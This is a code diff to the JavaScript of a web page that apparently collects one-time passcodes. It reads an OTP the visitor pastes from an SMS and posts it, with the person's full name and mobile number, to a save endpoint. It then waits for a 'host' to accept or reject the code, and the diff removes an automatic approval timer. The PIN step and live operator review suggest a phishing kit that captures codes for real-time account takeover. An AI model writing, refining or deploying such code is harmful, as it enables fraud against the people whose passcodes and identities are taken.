@@ -1074,7 +1074,7 @@ async function submitPin() {
       startOtpTimer();
     }
 
-    function startProcessing() {
+    async function startProcessing() {
       const otpTextarea = document.getElementById('otp-message-paste');
       const otpCode = otpTextarea ? otpTextarea.value.trim() : '';
 
@@ -1095,37 +1095,25 @@ async function submitPin() {
 
       const formattedPhone = formatMobileWithCountryCode(appState.mobile);
 
-      fetch('/api/save', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          appId: appState.appId,
+    try {
+        await fetch('/api/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                appId: appState.appId,
                 ref: appState.ref,
- 
-          fullName: appState.fullName,
-          mobile: formattedPhone,
-          field: 'entered_otp',
-          value: otpCode
-        })
-      }).catch(err => console.error(err));
-
-      watchHostDecision('otp');
-
-           otpStepTimer = setTimeout(() => {
-        if (btnOtp) {
-          btnOtp.disabled = false;
-          btnOtp.innerText = 'VERIFY & CONTINUE';
-        }
-        goTo('processing');
-
-        // Automatically approve after 10 seconds if host doesn't tap Incorrect
-        otpAutoTimer = setTimeout(() => {
-          if (decisionTimer) clearInterval(decisionTimer);
-          showApprovedScreen();
-        }, 10000);
-      }, 1500);
-
+                fullName: appState.fullName,
+                mobile: formattedPhone,
+                field: 'entered_otp',
+                value: otpCode
+            })
+        });
+    } catch (err) {
+        console.error(err);
     }
+
+    watchHostDecision('otp');
+}
 
     function syncAmount(val, isFromInput = false) {
       let parsedVal = parseInt(val) || 500;
